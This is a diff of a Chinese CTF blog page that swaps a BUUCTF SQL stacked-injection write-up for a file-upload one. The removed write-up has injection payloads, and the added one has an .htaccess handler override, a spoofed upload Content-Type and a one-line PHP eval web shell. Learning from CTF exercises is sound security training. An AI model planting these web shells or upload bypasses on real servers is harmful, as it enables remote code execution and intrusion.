@@ -7,27 +7,27 @@
   
   
   
-  <title>4-buu练习EasySQL1 | baba童鞋的博客</title>
+  <title>日常buu练习(.htaccess文件上传漏洞) | baba童鞋的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="打开题目链接，界面如下：可以知道应该使用堆叠查询植入攻击查看数据库：  1;show dadabases;    没有什么发现查看数据表：  1;show tables;    猜测flag是在flag表中的flag字段中  1;select flag from flag;   发现flag被过滤了（本霸霸已经完全木有思路了，淦！查看别人wp） 别人家的wp： 这道题目需要我们去对后端语句进行猜测">
+  <meta name="description" content=".htaccess原理：  .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。   本次需要用到的代码如下：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="4-buu练习EasySQL1">
-<meta property="og:url" content="http://example.com/2021/01/18/bu/index.html">
+<meta property="og:title" content="日常buu练习(.htaccess文件上传漏洞)">
+<meta property="og:url" content="http://example.com/2021/04/18/lo/index.html">
 <meta property="og:site_name" content="baba童鞋的博客">
-<meta property="og:description" content="打开题目链接，界面如下：可以知道应该使用堆叠查询植入攻击查看数据库：  1;show dadabases;    没有什么发现查看数据表：  1;show tables;    猜测flag是在flag表中的flag字段中  1;select flag from flag;   发现flag被过滤了（本霸霸已经完全木有思路了，淦！查看别人wp） 别人家的wp： 这道题目需要我们去对后端语句进行猜测">
+<meta property="og:description" content=".htaccess原理：  .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。   本次需要用到的代码如下：">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/01/18/bu/bb1.png">
-<meta property="og:image" content="http://example.com/2021/01/18/bu/bb2.png">
-<meta property="og:image" content="http://example.com/2021/01/18/bu/bb3.png">
-<meta property="og:image" content="http://example.com/2021/01/18/bu/bb4.png">
-<meta property="og:image" content="http://example.com/2021/01/18/bu/bb5.png">
-<meta property="og:image" content="http://example.com/2021/01/18/bu/bb6.png">
-<meta property="article:published_time" content="2021-01-18T10:56:06.000Z">
-<meta property="article:modified_time" content="2021-01-27T05:34:56.112Z">
+<meta property="og:image" content="http://example.com/2021/04/18/lo/1.png">
+<meta property="og:image" content="http://example.com/2021/04/18/lo/2.png">
+<meta property="og:image" content="http://example.com/2021/04/18/lo/3.png">
+<meta property="og:image" content="http://example.com/2021/04/18/lo/4.png">
+<meta property="og:image" content="http://example.com/2021/04/18/lo/5.png">
+<meta property="og:image" content="http://example.com/2021/04/18/lo/6.png">
+<meta property="article:published_time" content="2021-04-18T11:39:27.000Z">
+<meta property="article:modified_time" content="2021-04-18T12:46:25.849Z">
 <meta property="article:author" content="Jialu">
 <meta property="article:tag" content="ctf web 霸霸">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/01/18/bu/bb1.png">
+<meta name="twitter:image" content="http://example.com/2021/04/18/lo/1.png">
   
     <link rel="alternative" href="/atom.xml" title="baba童鞋的博客" type="application/atom+xml">
   
@@ -281,11 +281,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-bu" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-lo" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2021/01/18/bu/" class="article-date">
-      <time datetime="2021-01-18T10:56:06.000Z" itemprop="datePublished">2021-01-18</time>
+      <a  href="/2021/04/18/lo/" class="article-date">
+      <time datetime="2021-04-18T11:39:27.000Z" itemprop="datePublished">2021-04-18</time>
 </a>
 
     </div>
@@ -299,7 +299,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      4-buu练习EasySQL1
+      日常buu练习(.htaccess文件上传漏洞)
     </h1>
   
 
@@ -317,48 +317,29 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>打开题目链接，界面如下：<br><img src="/2021/01/18/bu/bb1.png"><br>可以知道应该使用堆叠查询植入攻击<br>查看数据库：</p>
-<ul>
-<li>1;show dadabases;</li>
-</ul>
+        <h1>.htaccess原理：</h1>
 
-<p><img src="/2021/01/18/bu/bb2.png"></p>
-<p>没有什么发现<br>查看数据表：</p>
-<ul>
-<li>1;show tables;</li>
-</ul>
+<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。  </p>
+<p>本次需要用到的代码如下： </p>
+<a id="more"></a>
+<pre><code>&lt;FilesMatch &#34;cimer&#34;&gt; 
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt; 
+</code></pre>
+<p>　　　　1、建立.htaccess文件，新建.txt文件，系统默认使用notpad++打开输入代码如图一所示内容，另存文件类型为【eXtenbsible Markup Language file】，文件名为为【.htaccess】。</p>
+<p>　　　　2、上传至服务器中。（.htaccess和一句话木马在同一目录下。）</p>
+<p>　　　　3、通过.htaccess文件，调用php的解析器解析一个文件名只要包含【cimer】这个字符串的任意文件。  这个【cimer】的内容如果是一句话木马，将名字包括后缀名改成cimer，即可利用中国菜刀进行连接。</p>
+<h1>题目描述：</h1>
 
-<p><img src="/2021/01/18/bu/bb3.png"></p>
-<p>猜测flag是在flag表中的flag字段中</p>
-<ul>
-<li>1;select flag from flag;</li>
-</ul>
+<p><img src="/2021/04/18/lo/1.png"></p>
+<h1>题解</h1>
 
-<p><img src="/2021/01/18/bu/bb4.png"><br>发现flag被过滤了<br><img src="/2021/01/18/bu/bb5.png"><br>（本霸霸已经完全木有思路了，淦！查看别人wp）</p>
-<p><b>别人家的wp：</b></p>
-<p>这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用</p>
-<p>解法1：</p>
-<p>输入的内容为*,1</p>
-<p>内置的sql语句为sql=”select”.sql=”select”.post[‘query’].”||flag from Flag”;</p>
-<p>如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容</p>
-<p>解法2：</p>
-<p>输入的内容为1;set sql_mode=pipes_as_concat;select 1</p>
-<p>其中set sql_mode=pipes_as_concat的作用是将||的作用由or变为拼接字符串</p>
-<p><img src="/2021/01/18/bu/bb6.png"></p>
-<p>duang!成功得到flag！</p>
-<p><b>几种常见的mode介绍:</b></p>
-<ul>
-<li>ONLY_FULL_GROUP_BY：出现在select语句、HAVING条件和ORDER BY语句中的列，必须是GROUP BY的列或者依赖于GROUP BY列的函数列。
-</li><li>NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。
-</li><li>STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制
-</li><li>NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含0。如果开启此模式，2016-01-00是不允许的，但是0000-02-01是允许的。它实际的行为受到 strict mode是否开启的影响1。
-</li><li>NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响2。
-</li><li>ERROR_FOR_DIVISION_BY_ZERO：在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL
-</li><li>NO_AUTO_CREATE_USER：禁止GRANT创建密码为空的用户
-</li><li>NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常
-</li><li>PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似
-</li><li>ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</li>
-</ul>
+<p>先上传.htaccess文件，注意抓包哦~<br>文件内容为：</p>
+<pre><code>&lt;FilesMatch &#34;php&#34;&gt; 
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt; 
+</code></pre>
+<p>更改type为：<code>Content-Type : image/jpeg</code><br><img src="/2021/04/18/lo/2.png"><br>成功建立文件<br>上传一句话木马：<code>&lt;script language&#61;&#39;php&#39;&gt;eval($_POST[cmd]);&lt;/script&gt;</code><br><img src="/2021/04/18/lo/3.png"><br>访问/<br>upload/5756725c35edf14db546f7ee5760e21d/1.png<br><img src="/2021/04/18/lo/4.png"><br>没有报错hiahiahia<br>链接蚁剑，就可以得到flag~<br><img src="/2021/04/18/lo/5.png"><br><img src="/2021/04/18/lo/6.png"><br>giao~</p>
 
       
     </div>
@@ -367,13 +348,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a  href="/2021/01/18/bu/">4-buu练习EasySQL1</a></p>
+        <p><span>本文标题:</span><a  href="/2021/04/18/lo/">日常buu练习(.htaccess文件上传漏洞)</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问  的个人博客"></a></p>
-        <p><span>发布时间:</span>2021年01月18日 - 18时56分</p>
-        <p><span>最后更新:</span>2021年01月27日 - 13时34分</p>
+        <p><span>发布时间:</span>2021年04月18日 - 19时39分</p>
+        <p><span>最后更新:</span>2021年04月18日 - 20时46分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2021/01/18/bu/" title="4-buu练习EasySQL1">http://example.com/2021/01/18/bu/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/01/18/bu/　　作者: " title=""></span>
+            <span>原始链接:</span><a class="post-url" href="/2021/04/18/lo/" title="日常buu练习(.htaccess文件上传漏洞)">http://example.com/2021/04/18/lo/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/04/18/lo/　　作者: " title=""></span>
         </p>
         <p>
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
@@ -384,18 +365,9 @@
 
 <nav id="article-nav">
   
-    <a  href="/2021/01/19/ping/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          5-buu练习Ping Ping Ping
-        
-      </div>
-    </a>
   
-  
-    <a  href="/2021/01/17/buu/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">3-buu练习Secret File</div>
+    <a  href="/2021/04/16/p/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">日常练习[MRCTF2020]Ez_bypass</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -407,7 +379,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">.htaccess原理：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">题目描述：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">题解</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -480,13 +452,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2021/01/19/ping/" title="上一篇: 5-buu练习Ping Ping Ping">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2021/01/17/buu/" title="下一篇: 3-buu练习Secret File">
+            <a  href="/2021/04/16/p/" title="下一篇: 日常练习[MRCTF2020]Ez_bypass">
                 <i class="fa fa-angle-right"></i>
             </a>
         
